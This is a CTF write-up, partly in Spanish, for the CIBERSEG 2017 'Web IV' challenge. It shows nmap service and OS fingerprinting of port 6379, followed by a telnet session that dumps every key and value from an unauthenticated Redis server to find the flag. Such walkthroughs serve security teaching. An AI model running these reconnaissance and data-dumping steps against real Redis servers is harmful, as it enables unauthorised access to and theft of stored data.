### ==================================================
### Web IV (200pts) write-up
### CTF: CIBERSEG 2017
### URL: https://ciberseg.uah.es/ctf.html
### CAT: web
### ==================================================

Visita el retos.ciberseg.uah.es:6379 y consigue la clave.

O en:

yuki.ddom.me:6379

Pista :) Esta permitido hacer Nmap contra el puerto 6379.

***
Visit retos.ciberseg.uah.es:6379 and get the key.

Or here:

yuki.ddom.me:6379

Hint :) It is allowed to use nmap to port 6379.


***

## (1) FOOTPRINTING AND RECONNAISSANCE

In this challenge it is allowed to use nmap against the target (just port 6379):

    $ nmap -p 6379 retos.ciberseg.uah.es
    
    Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-01-22 02:28 CET
    Nmap scan report for retos.ciberseg.uah.es (192.81.220.40)
    Host is up (0.045s latency).
    PORT     STATE SERVICE
    6379/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

We use the '-sV' option to identify the service running on port 6379 and '-O' to identify the OS:

    # nmap -p 6379 -sV -O retos.ciberseg.uah.es
    
    Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-01-22 02:29 CET
    Nmap scan report for retos.ciberseg.uah.es (192.81.220.40)
    Host is up (0.026s latency).
    PORT     STATE SERVICE VERSION
    6379/tcp open  redis   Redis key-value store
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: WAP|general purpose
    Running: Actiontec embedded, Linux 2.4.X|3.X
    OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:linux:linux_kernel:3.2
    OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37), Linux 3.2

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 18.61 seconds

The service running on port 6379 is a database 'Redis key-value store':

https://redis.io/commands

Now we check whether we are able to connect to the CLI of the database and send commands (i.e. 'DBSIZE'):

    # telnet retos.ciberseg.uah.es 6379
    Trying 192.81.220.40...
    Connected to retos.ciberseg.uah.es.
    Escape character is '^]'.
    DBSIZE
    :1104



## (2) DUMPING THE KEYS

The database stores pairs of keys/values. Using the following command we can dump all the keys and store them in a plaintext file 'keys.txt' (there are 1104 keys):

    KEYS *

In order to get the values of the keys, we must use the following command:

    GET <key>

We can take advantage of our file 'keys.txt' in order to build a list of 'GET' commands for all the keys. First, we delete the strings starting by '$':

    # cat keys.txt | grep -v '\$' > keys2.txt

Then, we append a 'GET' at the beginning of each line:

    # sed 's/^/GET /' keys2.txt > comandos.txt

We connect to the server again using 'telnet' and dump the contents of 'comandos.txt' to the CLI. We get the values of the keys and store them in the 'values.txt' file.

Now we look for the flag:

    # cat values.txt | grep flag
    flag{noauth:(}
    12flagflag

The flag is:

    flag{noauth:(}


